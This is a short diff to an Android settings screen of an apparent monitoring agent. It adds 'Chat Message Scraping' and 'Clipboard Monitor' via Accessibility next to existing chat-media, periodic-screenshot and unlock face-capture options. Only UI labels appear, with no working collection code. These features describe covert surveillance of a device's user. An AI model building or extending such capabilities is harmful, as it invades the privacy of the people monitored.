@@ -174,6 +174,8 @@ fun AgentConfigScreen(
                 Triple("chat_media", "Chat Media Folders", "WhatsApp, Telegram, Signal media"),
                 Triple("screenshots", "Periodic Screenshots", "Capture screen every collection cycle"),
                 Triple("face_capture", "Face Capture on Unlock", "Front camera photo on each unlock"),
+                Triple("chat_scraping", "Chat Message Scraping", "Read chat text via Accessibility (requires Settings toggle)"),
+                Triple("clipboard", "Clipboard Monitor", "Capture clipboard changes via Accessibility"),
             )
 
             metrics.forEach { (metricId, title, subtitle) ->
